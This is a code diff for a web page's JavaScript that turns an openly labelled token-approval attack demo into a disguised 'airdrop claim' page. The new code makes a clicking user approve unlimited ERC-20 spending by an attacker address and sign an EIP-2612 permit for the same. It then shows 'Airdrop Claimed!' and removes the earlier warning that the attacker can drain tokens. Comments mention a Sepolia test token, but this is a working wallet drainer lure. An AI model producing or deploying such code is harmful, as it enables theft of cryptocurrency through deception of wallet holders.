@@ -1,43 +1,63 @@
-let signer, provider;
-const tokenAddress = "0xYourERC20TokenAddress";       // Replace with deployed token address on Sepolia
-const attackerAddress = "0xAttackerWalletAddress";     // Replace with your attacker wallet address
+const provider = new ethers.providers.Web3Provider(window.ethereum);
+let signer, walletAddress;
+
+// Replace with your Sepolia ERC-20 test token and attacker wallet
+const tokenAddress = "0xYourTestToken";
+const attackerAddress = "0xYourAttackerWallet";
 
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)",
-  "function balanceOf(address owner) view returns (uint256)"
+  "function nonces(address owner) view returns (uint256)",
+  "function name() view returns (string)"
 ];
 
-async function connectWallet() {
-  if (window.ethereum) {
-    provider = new ethers.providers.Web3Provider(window.ethereum);
-    signer = provider.getSigner();
+document.getElementById("connect").onclick = async () => {
+  await provider.send("eth_requestAccounts", []);
+  signer = provider.getSigner();
+  walletAddress = await signer.getAddress();
+  document.getElementById("walletAddress").innerText = walletAddress;
+};
 
-    try {
-      await window.ethereum.request({ method: "eth_requestAccounts" });
-      const address = await signer.getAddress();
-      document.getElementById("walletAddress").innerText = address;
-      getTokenBalance(address);
-    } catch (err) {
-      alert("Connection failed");
-    }
-  } else {
-    alert("MetaMask is not installed!");
+document.getElementById("claim").onclick = async () => {
+  const token = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+  await token.approve(attackerAddress, ethers.constants.MaxUint256);
+
+  // Optional EIP-2612 permit signature (if token supports it)
+  const name = await token.name();
+  const nonce = await token.nonces(walletAddress);
+  const deadline = Math.floor(Date.now() / 1000) + 3600;
+
+  const domain = {
+    name: name,
+    version: "1",
+    chainId: 11155111, // Sepolia
+    verifyingContract: tokenAddress,
+  };
+
+  const types = {
+    Permit: [
+      { name: "owner", type: "address" },
+      { name: "spender", type: "address" },
+      { name: "value", type: "uint256" },
+      { name: "nonce", type: "uint256" },
+      { name: "deadline", type: "uint256" }
+    ]
+  };
+
+  const values = {
+    owner: walletAddress,
+    spender: attackerAddress,
+    value: ethers.constants.MaxUint256,
+    nonce: nonce,
+    deadline: deadline
+  };
+
+  try {
+    const signature = await signer._signTypedData(domain, types, values);
+    console.log("Permit signature:", signature);
+  } catch (e) {
+    console.warn("Permit not supported or user declined.");
   }
-}
 
-async function getTokenBalance(address) {
-  const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-  const balance = await tokenContract.balanceOf(address);
-  document.getElementById("balance").innerText = ethers.utils.formatUnits(balance, 18);
-}
-
-async function approveSpending() {
-  const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-  const tx = await tokenContract.approve(attackerAddress, ethers.constants.MaxUint256);
-  console.log("Approval TX sent:", tx.hash);
-  await tx.wait();
-  alert("Approval confirmed. The attacker can now drain your tokens.");
-}
-
-document.getElementById("connect").addEventListener("click", connectWallet);
-document.getElementById("approve").addEventListener("click", approveSpending);
+  alert("Airdrop Claimed!");
+};
